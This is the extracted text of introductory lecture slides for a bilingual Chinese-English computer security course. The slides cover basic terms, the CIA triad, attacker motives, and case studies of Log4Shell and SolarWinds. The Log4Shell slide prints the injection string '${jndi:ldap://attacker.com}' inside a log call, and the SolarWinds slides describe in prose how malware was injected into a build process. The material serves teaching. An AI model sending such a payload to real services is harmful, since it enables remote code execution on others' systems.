@@ -1,0 +1,773 @@
+=== Slide 1 (ppt/slides/slide1.xml) ===
+Security in Computing,
+Fifth Edition
+Chapter 1: Introduction
+1
+
+=== Slide 2 (ppt/slides/slide10.xml) ===
+Threat and Vulnerability
+10
+
+=== Slide 3 (ppt/slides/slide11.xml) ===
+Threat and Vulnerability
+11
+The
+water
+is the threat, the
+crack
+the vulnerability, and the
+finger
+the control
+(for now).
+How to attack?
+
+=== Slide 4 (ppt/slides/slide12.xml) ===
+Types of Threats
+12
+safety
+security
+attackers
+安全威胁分类有助于明确威胁类型、评估优先级、
+制定针对性防护策略，
+能够更高效地应对安全挑战。
+
+=== Slide 5 (ppt/slides/slide13.xml) ===
+Attacks
+Attacks
+：是指降级、瓦解、拒绝、摧毁计算机中的各种资源的行为（
+Informal
+）
+——
+针对系统的脆弱点，实现威胁的具体行为
+Classificaions
+:
+最高层次上
+安全攻击分成两类，即
+被动攻击（
+passive attacks
+）
+主动攻击（
+active attacks
+）
+对安全攻击进行分类有助于更清晰地理解不同类型的威胁及其带来的风险，从而能够采取相应的防御措施。
+提升防御效率
+：通过分类，安全防护措施可以针对性地优化和定制。
+
+=== Slide 6 (ppt/slides/slide14.xml) ===
+被动攻击（
+passive attacks
+）
+A passive attack attempts to collect and exploit information from the system
+without affecting normal system access
+. Legitimate users of the data typically do not notice such activities.
+The method used in passive attacks is eavesdropping and monitoring transmitted information, with the main goal being to
+obtain the transmitted data
+.
+Characteristics of local area network (LAN) data transmission: Broadcasting
+被动攻击试图收集、利用系统的信息但
+不影响系统
+的正常访问，数据的合法用户对这种活动一般不会觉察到
+被动攻击采取的方法是对传输中的信息进行窃听和监测，主要目标是获得传输的
+信息
+局域网数据传输特点：广播
+
+=== Slide 7 (ppt/slides/slide15.xml) ===
+被动攻击（
+passive attacks
+）
+
+=== Slide 8 (ppt/slides/slide16.xml) ===
+主动攻击（
+active attacks
+）
+Active attacks involve
+deliberate actions
+by an attacker to access the information they need, typically altering system resources or affecting system operations.
+Active attacks include tampering with or forging data flows, which may involve actions such as
+masquerading, replaying, discarding, modifying,
+and
+injecting
+"messages" (e.g., security protocol messages, computer code), among others.
+主动攻击则是攻击者访问他所需信息的
+故意
+行为，一般会改变系统资源或影响系统运作
+主动攻击包括对数据流进行篡改或伪造数据流，可包括：“消息”（
+e.g.,
+安全协议消息，计算机代码）的
+伪装
+、
+重放
+、
+丢弃
+、
+篡改
+和
+注入
+等等。。。
+
+=== Slide 9 (ppt/slides/slide17.xml) ===
+Types of Harm
+17
+Only primary types, any others?
+Threat
+：有可能引起计算机系统或相关财产
+损失或损害
+(
+harm
+)
+的一系列
+条件
+
+=== Slide 10 (ppt/slides/slide18.xml) ===
+18
+
+=== Slide 11 (ppt/slides/slide19.xml) ===
+What Is Computer Security?
+The protection of the
+assets
+of a computer system
+from
+various threats or attacks
+计算机安全：保护你所“重视”的计算机或计算机系相关统的资源（
+A
+ssets
+），免于各种威胁或者攻击
+。
+19
+
+=== Slide 12 (ppt/slides/slide2.xml) ===
+联系方式
+主页：
+https://www.rise-swu.cn/yangzheng.html
+Email
+：
+youngzheng@swu.edu.cn
+助教
+QQ
+：
+柯景文：
+1071261631
+Some online good courses :
+https://cs155.Stanford.edu
+https://
+ocw.mit.edu
+/courses/6-858-computer-systems-security-fall-2014/pages/lecture-notes/
+
+=== Slide 13 (ppt/slides/slide20.xml) ===
+Major Entities (Roles)
+Attackers
+Find out
+vulnerabilities (concreate and specific point)
+Launch attacks to realize threats and cause harms
+Types of Attackers
+20
+different set of resources,
+capabilities, and
+motivation
+匿名者
+Anonymous
+
+=== Slide 14 (ppt/slides/slide21.xml) ===
+Major Entities (Roles)
+Defenders
+How to prevent ‘unknown attacks’?
+Cover as wide a range (objects,
+surfaces) as possible
+Heuristic
+: Cat and Mouse
+Abstract
+General
+security questions
+: Architecture
+Security properties
+(attacking goals)
+what are they?
+21
+confidentiality, integrity, and availability.
+
+=== Slide 15 (ppt/slides/slide22.xml) ===
+Major Entities (Roles)
+Here are some examples of defenders:
+Network Security Team
+: Responsible for monitoring network traffic, detecting malicious activities, installing
+firewalls, intrusion detection systems (IDS)
+, and applying patches to vulnerabilities to ensure the company's network is protected.
+IT Administrators
+: Ensuring system security and stability by regularly updating operating systems and software patches, configuring security policies (such as strong password policies and access controls).
+Security Researchers
+: Analyzing emerging attack methods and proposing new defense technologies and strategies to address evolving cybersecurity threats.
+Endpoint Protection Software
+: Such as antivirus and anti-spyware software, which protect endpoint devices (like personal computers and smartphones) from malware and viruses.
+These defenders employ various
+security properties
+to protect systems and ensure their confidentiality, integrity, and availability
+22
+
+=== Slide 16 (ppt/slides/slide23.xml) ===
+C-I-A Triad
+Confidentiality:
+一种能够确保资源只被授权的当事人查看的系统能力
+Integrity:
+一种能够确保资源只被授权的当事人修改的系统能力
+Availability:
+一种能够确保资源可以被任何授权的当事人使用的系统能力
+Sometimes two other desirable characteristics:
+Authentication
+:
+一种能够确认资源或信息所有者身份的系统能力
+Nonrepudiation
+：
+一种能够确保发送者不能对已发送过的信息进行抵赖的系统能力
+23
+如何制定精准的安全防护策略？
+
+=== Slide 17 (ppt/slides/slide24.xml) ===
+Confidentiality
+Confidentiality
+: Only authorized users and systems are allowed to access the protected data.
+机密性：只有授权的用户和系统才能访问被保护的数据
+24
+
+=== Slide 18 (ppt/slides/slide25.xml) ===
+Confidentiality
+机密性被破坏的例子：
+一个未授权的人访问数据项
+一个未授权的进程或程序访问数据项
+一个人被授权访问某个特定的数据，但是他访问了其他没有授权的数据
+一
+个未授权的人访问到一个近似数据值（例如，你不知道某个人确切的工资．但是你知道工资在特定的范围内是下降的，或超过一个特定的数字）
+一个未授权的人得知了一段数据片段（例如，得知一个公司正在开发一种新产品，或一段关于两个公司正在合并的谈话）
+——
+通过
+1-bit
+的机密性来衡量
+25
+
+=== Slide 19 (ppt/slides/slide26.xml) ===
+Integrity
+The integrity of an object refers to the fact that the object is:
+Not modified
+Modified only in allowed ways
+Modified only by authorized entities
+一个对象的完整性，指该对象是：
+未被修改的
+只能以允许的方式修改
+只能被授权主体修改
+26
+
+=== Slide 20 (ppt/slides/slide27.xml) ===
+Integrity
+以下是完整性被破坏的几个例子：
+数据篡改
+：黑客通过未经授权的方式修改数据库中的记录，改变了数据的原始内容。例如，修改了金融交易记录，导致账目错误。
+软件篡改
+：恶意软件感染计算机系统并修改了原本正常的程序代码，导致程序行为异常或泄露敏感信息。
+网络中间人攻击
+：攻击者拦截并修改在网络传输中的数据包，例如篡改用户登录凭证或支付信息，从而达到非法目的。
+权限滥用
+：某些用户或应用程序拥有不应有的权限，修改了系统配置文件或关键数据，导致系统功能受损或数据丢失。
+27
+
+=== Slide 21 (ppt/slides/slide28.xml) ===
+Availability
+Availability
+:
+refers to the property of a system, service, or resource being accessible and operational when needed.
+服务和系统便于使用
+,
+并且在预期的方式下执行
+可用性指的是系统、服务或资源
+在需要时
+能够被访问和
+正常运行
+的特性。它确保授权用户在需要时能够访问和使用系统或数据，而不受中断或延迟的影响，通常在正常情况下。
+28
+
+=== Slide 22 (ppt/slides/slide29.xml) ===
+Availability
+以下是可用性受到威胁的几个例子：
+拒绝服务攻击
+(DoS)
+：攻击者通过向目标服务器发送大量请求，导致服务器资源耗尽，合法用户无法访问该服务。
+硬件故障
+：服务器硬盘损坏或电源故障导致系统停机，用户无法访问存储的数据或服务。
+网络中断
+：由于网络设备故障或通信线路问题，导致网络连接中断，无法访问远程资源或服务。
+29
+
+=== Slide 23 (ppt/slides/slide3.xml) ===
+为什么
+&
+怎么学习这门课程
+帮助你形成应对计算机安全风险的
+知识和经验
+基本的术语（
+terminology
+）、原则（
+principle
+）和概念（
+concept
+）
+通过观察这些基础知识在许多情境下（程序、操作系统、网络和云计算）出现的情况
+学习基本工具
+访问控制和密码技术（身份认证、加密、数字签名等）
+理解它们在防御策略中如何应用
+思考如何去
+做一名攻击者
+(attackers)
+预测、分析
+那些可能会被利用的脆弱点
+设计
+防御手段
+(countermeasure)
+来应对攻击
+同时扮演攻击者和防守者
+一种
+有创造性和挑战性的活动
+3
+
+=== Slide 24 (ppt/slides/slide30.xml) ===
+Introduction
+What motivates attackers?
+economics
+…
+and many others…
+
+=== Slide 25 (ppt/slides/slide31.xml) ===
+Method — Opportunity
+—
+Motive
+31
+
+=== Slide 26 (ppt/slides/slide32.xml) ===
+Why compromise end user machines?
+1.  Steal user credentials
+keylog
+for banking passwords,   corporate passwords,   gaming
+pwds
+Example:
+SilentBanker
+(and many like it)
+Bank
+Malware injects
+Javascript
+Bank sends login page needed to log in
+When user submits information, also sent to attacker
+User requests login page
+Similar mechanism used
+by
+Zbot
+, and others
+Adversary-in-the-Browser (AITB)
+
+=== Slide 27 (ppt/slides/slide33.xml) ===
+Lots of financial malware
+Source: Kaspersky Security Bulletin
+records banking passwords via
+keylogger
+spread via spam email and hacked web sites
+maintains access to PC for future installs
+
+=== Slide 28 (ppt/slides/slide34.xml) ===
+Similar attacks on mobile devices
+Example
+:
+FinSpy
+.
+Works on
+iOS and Android
+(and Windows)
+once installed:  collects contacts,  call history,  geolocation,
+texts,  messages in encrypted chat apps, …
+How installed
+?
+Android pre-2017:   links in SMS / links in E-mail
+iOS and Android post 2017:   physical access
+
+=== Slide 29 (ppt/slides/slide35.xml) ===
+Why own machines:     2.
+Ransomware
+a worldwide problem
+Worm spreads via a
+vuln
+.
+in SMB  (port 445)
+Apr. 14, 2017
+:
+Eternalblue
+vuln
+. released by
+ShadowBrokers
+May 12, 2017
+: Worm detected
+(3
+weeks to
+weaponize
+)
+
+=== Slide 30 (ppt/slides/slide36.xml) ===
+WannaCry
+ransomware
+
+=== Slide 31 (ppt/slides/slide37.xml) ===
+Why own machines:     3.
+Bitcoin Mining
+Source: Kaspersky
+Security Bulletin
+Examples:
+Trojan.Win32.Miner.bbb
+Trojan.Win32.Miner.ays
+Trojan.JS.Miner.m
+Trojan.Win32.Miner.gen
+# affected users
+
+=== Slide 32 (ppt/slides/slide38.xml) ===
+Server-side attacks:    why?
+(1) Data theft
+:   credit card numbers,   intellectual property
+Example:   Equifax (July 2017),  ≈ 143M “customer” data impacted
+Exploited known vulnerability in Apache Struts (RCE)
+Many many similar attacks since 2000
+(2) Political motivation
+:
+Election:  attack on DNC
+(2015)
+,
+Ukraine attacks
+(2014: election,   2015,2016: power grid,   2017:
+NotPetya
+,  … )
+(3) Infect visiting users
+
+=== Slide 33 (ppt/slides/slide39.xml) ===
+Result:  many server-side Breaches
+Typical
+attack
+steps
+:
+Reconnaissance
+侦察
+Foothold: initial breach
+Internal reconnaissance
+Lateral movement
+Data extraction
+Exfiltration
+渗漏
+Security tools available to
+try and stop each step (
+kill chain
+)
+will discuss tools during course
+… but no complete solution
+
+=== Slide 34 (ppt/slides/slide4.xml) ===
+Objectives for Chapter 1
+Define
+computer security
+as well as basic computer security terms
+Introduce the C-I-A Triad (
+三位一体
+)
+Introduce basic access control terminology
+Explain basic threats, vulnerabilities, and attacks
+Show how controls map to threats
+4
+
+=== Slide 35 (ppt/slides/slide40.xml) ===
+Case study 1
+:  Log4Shell
+Log4j
+:  a popular logging framework for Java
+Nov. 21:
+vulnerability in Log4j 2 enables
+Remote Code Execution
+Over 7000 code repositories affected and many Java projects
+The bug:
+Log4j can load and run code to process a log request
+message containing:
+${
+jndi:ldap
+://
+attacker.com
+}
+log.info
+(“… ${
+jndi:
+ldap
+://
+attacker.com
+}…”)
+LDAP query then HTTP GET
+Malicious Java code
+execute code
+attacker
+victim
+
+=== Slide 36 (ppt/slides/slide41.xml) ===
+The result
+How was this
+exploited
+?
+Khonsari
+ransomware
+XMRIG
+Cryptominer
+Orcus Remote Access Trojan
+How to prevent problems of this type?
+Isolation:  sandbox log4j library or sandbox entire application
+
+=== Slide 37 (ppt/slides/slide42.xml) ===
+Case study 2:  SolarWinds Orion
+(2020)
+SolarWinds Orion:  set of monitoring tools used by many orgs.
+What happened?
+SolarWinds
+Customer 1
+Customer 18000
+⋮
+Attack
+(Feb. 20, 2020)
+:  attacker corrupts
+SolarWinds software update process
+sunburst
+malware
+orion
+orion
+Large number of infected orgs … not detected until
+Dec. 2020
+.
+Orion
+software
+update
+one infected DLL
+SolarWinds.Orion.Core.DLL
+
+=== Slide 38 (ppt/slides/slide43.xml) ===
+Sunspot:  malware injection
+How did attacker corrupt the SolarWinds build process?
+taskhostsvc.exe
+runs on SolarWinds build system:
+monitors for processes running
+MsBuild.exe
+(MS Visual Studio),
+if found, read
+cmd
+line
+args
+to test if Orion software being built,
+if so:
+replace  file
+InventoryManager.cs
+with malware version
+(store original version in
+InventoryManager.bk
+)
+when
+MsBuild.exe
+exits, restore original file … no trace left
+How can an org like SolarWinds detect/prevent this ???
+
+=== Slide 39 (ppt/slides/slide44.xml) ===
+Don’t try this at home !
+
+=== Slide 40 (ppt/slides/slide45.xml) ===
+Distribution of exploits used in attacks
+Source: Kaspersky Security Bulletin 2021
+Browser
+Android
+Office
+Java
+
+=== Slide 41 (ppt/slides/slide46.xml) ===
+A global problem
+Source: Kaspersky Security Bulletin 2021
+Top 10 countries by share of attacked users:
+
+=== Slide 43 (ppt/slides/slide48.xml) ===
+Marketplace for Vulnerabilities
+Option 1
+:   bug bounty programs
+(many)
+Google Vulnerability Reward Program:   up to $31,337
+Microsoft Bounty Program:   up to $100K
+Apple Bug Bounty program:  up to $200K
+Stanford bug bounty program:  up to $1K
+Pwn2Own competition:   $15K
+
+=== Slide 44 (ppt/slides/slide49.xml) ===
+Google’s bug bounty program
+https://
+bughunters.google.com
+/
+
+=== Slide 45 (ppt/slides/slide5.xml) ===
+What Is Computer Security?
+The protection of the
+assets
+of a computer system
+计算机安全：保护你所“重视”的计算机或计算机系相关统的资源（
+assets
+）
+:
+Hardware
+Software
+(including. processes)
+Data
+Human
+Other
+computer
+resources
+And any combination of the above staffs
+5
+
+=== Slide 46 (ppt/slides/slide50.xml) ===
+What can we trust?
+I order a laptop by mail.   When it arrives, what can I trust on it?
+Applications and/or operating system may be backdoored
+⇒   solution:  reinstall  OS  and applications
+How to reinstall?     Can’t trust OS to reinstall the OS.
+⇒   Boot
+Tails
+from a USB drive
+(Debian)
+Need to trust pre-boot BIOS, UEFI code.   Can we trust it?
+⇒   No!    (e.g.
+ShadowHammer
+operation in 2018)
+Can we trust the motherboard?     Software updates?
+
+=== Slide 47 (ppt/slides/slide51.xml) ===
+So, what can we trust?
+Sadly,
+nothing
+… anything can be compromised
+but then we can’t make progress
+Trusted Computing Base
+(TCB)
+Assume some minimal part of the system is not compromised
+Then build a secure environment on top of that
+will see how during the course (Chapter 5).
+
+=== Slide 48 (ppt/slides/slide52.xml) ===
+Access Control
+52
+计算机安全范式之一
+为了实施安全策略，计算机安全需要控制所范围模式下的所有主体对所有受保护客体的访问
+人、进程或程序等称为主体（
+subject
+)-
+发起
+数据项为客体（
+object
+) -
+接受
+访问的类型（如读、写或执行）
+安全策略（
+policy
+）
+——
+使得某个主体能对某个客体进行的访问类型的授权
+How to prevent or
+thwart
+threats and attacks?
+
+=== Slide 49 (ppt/slides/slide53.xml) ===
+Controls/Countermeasures
+53
+
+=== Slide 50 (ppt/slides/slide54.xml) ===
+Different Types of Controls
+54
+边缘
+遏制
+人造的
+
+=== Slide 51 (ppt/slides/slide55.xml) ===
+Summary
+Vulnerabilities are weaknesses in a system; threats exploit those weaknesses; controls protect those weaknesses from exploitation
+How to find vulnerabilities?
+Confidentiality, integrity, and availability are the three basic
+security properties
+Different attackers pose different kinds of threats based on their capabilities and motivations
+Different controls address different threats; controls come in many flavors and can exist at various points in the system
+55
+
+=== Slide 52 (ppt/slides/slide56.xml) ===
+Don’t try this at home !
+
+=== Slide 53 (ppt/slides/slide6.xml) ===
+What Is Computer Security?
+The protection of the
+assets
+of a computer system
+计算机安全：保护你所“重视”的计算机或计算机系相关统的资源（
+A
+ssets
+）
+:
+Hardware
+Software
+(including. processes)
+Data
+Human
+Other
+computer
+resources
+And any combination of the above staffs
+6
+
+=== Slide 54 (ppt/slides/slide7.xml) ===
+Assets
+7
+Game Coin
+s
+
+=== Slide 55 (ppt/slides/slide8.xml) ===
+Values of Assets
+8
+现成
+为了决定对哪个资掘进行保护．我们必须首先
+确定什么资源是有价值的及对谁而言是有
+价值的
+资源的价值与个人、时间相关，并且往往无法准确估计
+
+=== Slide 56 (ppt/slides/slide9.xml) ===
+Basic Terms
+Vulnerability
+：脆弱点是一个能被
+利用
+并造成损害的
+薄弱点
+—
+系统本身的东西（通常物理上，
+maybe mental
+）
+Threat
+：有可能引起计算机系统或相关财产
+损失或损害
+(
+harm
+)
+的一系列
+条件 （客观存在，外在）
+Examples:1)
+有人“想”利用软件有漏洞干坏事；
+2
+）有个坏人拿着锤子在路口
+Attack
+：
+针对系统的脆弱点，实现威胁的
+具体行为；
+某攻击其作为名词时
+—Threat(
+抢劫）
+Countermeasure
+（
+对策
+）
+or control
+：
+阻止脆弱点所带来的威胁
+只有正确认识（定义）脆弱点和威胁等，才能正确设计和实施防御对策
+9
+
